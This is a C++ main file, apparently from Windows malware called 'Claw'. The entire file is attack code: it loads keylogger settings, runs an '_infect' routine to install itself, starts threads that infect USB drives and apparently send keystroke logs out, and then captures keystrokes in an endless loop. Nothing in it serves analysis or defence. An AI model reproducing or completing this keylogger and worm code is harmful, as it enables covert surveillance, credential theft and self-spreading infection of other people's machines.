#include "Claw.h"

int main
()
{
    Claw crs;
    crs.GetKeyLoggerInformation(); // Load information
    crs._infect(); // Infect the system
    SetCurrentDirectory((LPSTR)crs.HQ.c_str()); // Set working directory to Install location
    
    HANDLE ht = CreateThread( NULL, 0, USBINFECT,NULL, 0, NULL);  // Create Usb Infection thread
    if (ht == NULL)
    {
        exit(1);
    }

    HANDLE hThread = CreateThread( NULL, 0, NOTIFIER, NULL, 0, NULL); // Create Log Notifier thread
    if (hThread == NULL)
    {
        exit(1);
    } 
    // Start Keylogging
    while(true)
    {
        Sleep(10);
        crs.Keylogger();
    }
   
    return 0;
}